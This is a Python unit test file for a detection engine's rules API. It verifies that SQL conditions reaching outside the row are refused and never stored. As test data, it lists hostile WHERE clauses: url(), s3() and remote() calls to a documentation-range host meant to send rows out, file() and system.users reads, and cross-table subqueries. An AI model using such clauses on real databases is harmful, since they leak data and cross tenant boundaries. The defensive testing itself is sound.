#  Project:      dfe-engine
#  File:         tests/unit/test_api/test_rules_offbox_calls.py
#  Purpose:      A rule whose SQL reads outside the row is refused and never written
#  Language:     Python
#
#  License:      BUSL-1.1
#  Copyright:    (c) 2026 HYPERI PTY LIMITED
"""POST and PUT /api/v1/rules refuse a condition that leaves the row.

``rule:write`` is held by data_analyst, and the saved rule's condition runs in
the volume preview and in the hunt runner's ``INSERT ... SELECT``, so a call
such as ``url()`` would carry the row to whatever host it names, and a subquery
would read another org's rows. The addresses below are in the documentation
range (RFC 5737) and nothing here opens a socket.
"""

import pytest

pytestmark = pytest.mark.usefixtures("rule_sources")

# One refused call per family, written as a rule author would.
OFFBOX_WHERE = {
    "url": "url('http://203.0.113.9/leak', 'LineAsString') = 1",
    "s3": "s3('https://203.0.113.9/bucket/key', 'CSV') = 1",
    "file": "file('hostname') LIKE '%a%'",
    "remote": "remote('203.0.113.9', system.users) = 1",
    "dictionary": "dictGet('t', 'name', toUInt64(1)) = 'acme'",
    "ai": "aiFilter(toString(_json), 'is it bad') = 1",
    "globalIn": "globalIn(_source, dfe.main)",
    "in": "in(_source, dfe.main)",
    "in beside a real condition": ("severity = 'high' AND in(_source, dfe.main)"),
    "beside a real condition": ("severity = 'high' AND url('http://203.0.113.9/') = 1"),
}

_KEPT_WHERE = "severity = 'high'"


def _payload(name: str, where_clause: str) -> dict:
    return {
        "name": name,
        "display_name": "Off-box",
        "severity": "high",
        "where_clause": where_clause,
        "source": "windows-audit",
    }


def _assert_refused(resp) -> None:
    assert resp.status_code == 422, resp.text
    body = resp.json()
    assert body["code"] == "invalid_sql"
    messages = [error["message"] for error in body["sql_errors"]]
    assert any("may not call" in message for message in messages), messages


@pytest.mark.parametrize("where_clause", OFFBOX_WHERE.values(), ids=list(OFFBOX_WHERE))
def test_create_refuses_a_call_outside_the_row_and_writes_nothing(
    client, admin_headers, where_clause
):
    resp = client.post(
        "/api/v1/rules", json=_payload("offbox", where_clause), headers=admin_headers
    )

    _assert_refused(resp)
    assert client.get("/api/v1/rules/offbox", headers=admin_headers).status_code == 404


@pytest.mark.parametrize("where_clause", OFFBOX_WHERE.values(), ids=list(OFFBOX_WHERE))
def test_update_refuses_it_and_keeps_the_stored_condition(client, admin_headers, where_clause):
    created = client.post(
        "/api/v1/rules", json=_payload("kept_offbox", _KEPT_WHERE), headers=admin_headers
    )
    assert created.status_code == 201, created.text

    resp = client.put(
        "/api/v1/rules/kept_offbox",
        json=_payload("kept_offbox", where_clause),
        headers=admin_headers,
    )

    _assert_refused(resp)
    stored = client.get("/api/v1/rules/kept_offbox", headers=admin_headers).json()
    assert stored["where_clause"] == "severity = 'high'"


def test_validate_reports_the_call_without_creating_anything(client, admin_headers):
    resp = client.post(
        "/api/v1/rules/validate",
        json={"sql": f"SELECT * FROM dfe.main WHERE {OFFBOX_WHERE['url']}"},
        headers=admin_headers,
    )

    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert body["valid"] is False
    assert any("may not call url()" in error["message"] for error in body["errors"])


def test_a_rule_over_its_own_rows_is_still_accepted(client, admin_headers):
    resp = client.post(
        "/api/v1/rules", json=_payload("permitted", _KEPT_WHERE), headers=admin_headers
    )

    assert resp.status_code == 201, resp.text
    assert resp.json()["sql_errors"] == []


@pytest.mark.parametrize(
    "condition",
    [
        "_source IN (SELECT ioc FROM threat.iocs)",
        "_source NOT IN (SELECT ioc FROM threat.iocs)",
        "_source IN threat.iocs",
        "_source IN (threat.iocs)",
    ],
    ids=["lookup", "excluded_lookup", "table", "bracketed_table"],
)
def test_a_rule_reading_another_table_is_refused_and_never_written(
    client, admin_headers, condition
):
    """The hunt runner's user reads every org, so another table answers past the hunt's orgs."""
    resp = client.post(
        "/api/v1/rules",
        json=_payload("lookup", f"{condition}"),
        headers=admin_headers,
    )

    assert resp.status_code == 422, resp.text
    messages = [error["message"] for error in resp.json()["sql_errors"]]
    assert any("SELECT" in message or "after IN" in message for message in messages), messages
    assert client.get("/api/v1/rules/lookup", headers=admin_headers).status_code == 404


@pytest.mark.parametrize(
    ("name", "condition"),
    [
        ("listed", "severity IN ('high', 'critical')"),
        ("excluded", "severity NOT IN ('low')"),
    ],
)
def test_a_rule_using_the_in_operator_is_accepted(client, admin_headers, name, condition):
    resp = client.post(
        "/api/v1/rules",
        json=_payload(name, f"{condition}"),
        headers=admin_headers,
    )

    assert resp.status_code == 201, resp.text
    assert resp.json()["sql_errors"] == []
    stored = client.get(f"/api/v1/rules/{name}", headers=admin_headers).json()
    assert stored["where_clause"] == condition
